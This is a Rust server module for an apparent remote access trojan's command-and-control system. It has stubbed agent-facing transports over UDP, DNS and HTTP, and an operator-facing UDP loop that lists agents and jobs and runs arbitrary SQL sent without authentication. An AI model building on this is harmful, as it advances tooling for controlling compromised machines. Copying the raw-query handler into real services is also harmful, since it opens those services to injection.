//! lib.rs --- server

//! Not exactly the most elegant design, but it gets the job
//! done. This is the server component of Poor Richard's Pet
//! Rat.
//!
//! First, some terminology.
//!
//! + *frontend* refers to the server <--> agent interface.
//! + *backend* refers to the server <--> client (operator) interface.
//!
//! There are currently *3* different transport methods available for
//! the frontend.
//!
//! + *UDP* datagrams (default)
//! + *DNS* packets
//! + *HTTP/S*
//!
//! These transports are conditionally compiled with feature
//! flags ("udp", "dns", "http").
//!
//! There is only *1* transport method available for the backend which
//! is raw *UDP* using a simple TLV message codec. It would be trivial
//! to implement other transports if needed, but I prefer this simple
//! message-based format which is quite flexible and can interop well
//! with a variety of tools. For example, see `client/pr2.el' which
//! provides an Emacs UI.
//!
//! The frontend and backend run independently in separate
//! threads. Each interface binds to a network socket and listens for
//! incoming packets for their assigned transport (UDP/etc). Packets
//! are decoded and dispatched to an appropriate handler which will
//! then issue a response if needed or continue processing packets.
//!
//! The packet handlers require certain resources such as database
//! access, encryption keys, etc to issue responses, so these
//! resources are shared between the transport threads. The `Service'
//! struct contains these resources and is wrapped in an `Arc'.

pub mod cfg;
pub mod db;
pub mod error;

#[cfg(feature = "udp")]
pub mod udp;

#[cfg(feature = "dns")]
pub mod dns;

#[cfg(feature = "http")]
pub mod http;

pub use cfg::Cfg;
pub use db::Pool;
pub use error::Error;

use bytes::BytesMut;
use proto::{
  api::{c2, op::OpCode},
  codec::OpCodec,
};
use sqlx::Row;
use std::{io, net::SocketAddr, sync::Arc};
use tokio::net::UdpSocket;
use tokio_util::{codec::Decoder, udp::UdpFramed};

/// The server Frontend
#[derive(Clone, Debug)]
pub struct TxService {
  pub addr: SocketAddr,
  pub pool: Pool,
}

impl TxService {
  pub fn new(addr: SocketAddr, pool: Pool) -> TxService {
    TxService { addr, pool }
  }

  //  TODO 2022-08-23: startv1 = killswitch
  //       - respect shutdown signal sent from client
  //       - respect sleep message
  //       - look into TLS for mutable local storage
  pub async fn start(&self) -> Result<(), Error> {
    Ok(())
  }

  #[cfg(feature = "http")]
  pub async fn start_http(self) -> Result<(), Error> {
    let addr = self.addr;
    log::info!("http tx_service listening on: {}", &addr);
    let app_state = Arc::new(http::AppState::new(self));
    let routes = http::routes(app_state);
    warp::serve(routes).bind(addr).await;
    Ok(())
  }

  #[cfg(feature = "dns")]
  pub async fn start_dns(&self) -> Result<(), Error> {
    let addr = self.addr;
    log::info!("dns tx_service listening on: {}", &addr);
    Ok(())
  }

  #[cfg(feature = "udp")]
  pub async fn start_udp(&self) -> Result<(), Error> {
    let addr = self.addr;
    log::info!("udp tx_service listening on: {}", &addr);
    Ok(())
  }
}

/// The server Backend
#[derive(Debug)]
pub struct RxService {
  addr: SocketAddr,
  pool: Pool,
}

impl RxService {
  /// initialize a new RxService given ADDR and POOL
  pub fn new(addr: SocketAddr, pool: Pool) -> RxService {
    RxService { addr, pool }
  }

  //  TODO 2022-08-23: refactor..
  //       - each opcode gets separate handler fn(op, val) -> Result<T,Error>
  //       - leverage more concurrency if possible
  pub async fn start_rx(&self) -> Result<(), Error> {
    log::info!("udp rx_service binding on: {}", self.addr);
    let socket = UdpSocket::bind(self.addr).await?;
    let mut inf = UdpFramed::new(socket, OpCodec {});
    let mut rx_buf = &mut BytesMut::with_capacity(proto::codec::op::MAX_FRAME_SIZE);
    let mut tx_buf = &mut BytesMut::with_capacity(proto::codec::op::MAX_FRAME_SIZE);
    loop {
      // wait for socket to be readable
      inf.get_ref().readable().await?;
      match inf.get_mut().try_recv_buf_from(&mut rx_buf) {
        Ok((n, client)) => {
          rx_buf.truncate(n);
          log::trace!("RX FROM {}", &client);
          match inf.codec_mut().decode(&mut rx_buf) {
            Ok(Some(m)) => {
              log::trace!("{m}");
              let val = m.val();
              match m.top() {
                OpCode::GET => {
                  let argstr = String::from_utf8(val)?;
                  log::trace!("val: {}", &argstr);

                  let mut args = argstr.split_whitespace();

                  match args.next() {
                    Some(key) => {
                      log::trace!("getting key: {}", &key);
                      match key {
                        "agents" => {
                          let res: c2::AgentsList = db::list_agents(&self.pool)
                            .await?
                            .into_iter()
                            .map(|a| a.into())
                            .collect::<Vec<c2::Agent>>()
                            .into();
                          log::trace!("sending response: {:?}", res);
                          tx_buf.extend(res.to_string().bytes())
                        }
                        "jobs" => {
                          let res: c2::JobsList = db::list_jobs(&self.pool)
                            .await?
                            .into_iter()
                            .map(|a| a.into())
                            .collect::<Vec<c2::Job>>()
                            .into();
                          log::trace!("sending response: {:?}", res);
                          tx_buf.extend(res.to_string().bytes())
                        }
                        _ => {
                          log::warn!("`val: invalid key");
                          tx_buf.extend_from_slice("`val: invalid key".as_bytes())
                        }
                      }
                    }
                    None => {
                      log::error!("`val: missing key");
                      tx_buf.extend_from_slice("`val: missing key".as_bytes())
                    }
                  }
                }
                OpCode::QUERY => {
                  let query = String::from_utf8(val)?;
                  log::trace!("val: {}", &query);
                  match sqlx::query(&query).fetch_all(&self.pool.reader).await {
                    Ok(res) => {
                      for row in res {
                        for i in 0..row.len() {
                          // first we check for specific values (uuid, timestamptz)
                          if let Ok(v) = row.try_get::<uuid::Uuid, _>(i) {
                            log::debug!("uuid: {:?}", &v);
                            tx_buf.extend_from_slice(v.to_string().as_bytes());
                          } else if let Ok(v) = row.try_get::<chrono::DateTime<chrono::Utc>, _>(i) {
                            log::debug!("timestamptz: {:?}", &v);
                            tx_buf.extend_from_slice(v.to_string().as_bytes())
                            // else we parse as raw
                          } else if let Ok(v) = row.try_get_raw(i) {
                            // try to parse as str
                            match v.as_str() {
                              Ok(v) => {
                                log::debug!("string result: {:?}", &v);
                                tx_buf.extend_from_slice(v.as_bytes())
                              }
                              Err(e) => {
                                log::warn!("{}", e.to_string());
                                // .. otherwise parse as bytes
                                match v.as_bytes() {
                                  Ok(v) => {
                                    log::debug!("bytes result: {:?}", &v);
                                    tx_buf.extend_from_slice(v)
                                  }
                                  Err(e) => {
                                    log::warn!("{}", e.to_string());
                                  }
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                    Err(e) => {
                      log::error!("`db: {}", e);
                      tx_buf.extend(e.to_string().bytes())
                    }
                  }
                }
                _ => {
                  log::error!("`nyi");
                  tx_buf.extend_from_slice("`nyi".as_bytes())
                }
              }
              // wait for socket to be writable
              inf.get_ref().writable().await?;
              match inf.get_mut().try_send_to(&mut tx_buf, client) {
                Ok(n) => log::trace!("TX {} TO {}", n, client),
                Err(ref e) if e.kind() == io::ErrorKind::WouldBlock => {
                  continue;
                }
                Err(e) => return Err(e.into()),
              }
            }
            Ok(None) => continue,
            // FIXME
            Err(e) => {
              log::error!("error during decode: {}", e);
              continue;
            }
          }
          // clear our buffers then proceed to next iteration
          tx_buf.clear();
          rx_buf.clear();
          continue;
        }
        Err(ref e) if e.kind() == io::ErrorKind::WouldBlock => {
          continue;
        }
        Err(e) => {
          return Err(e.into());
        }
      }
    }
  }
}
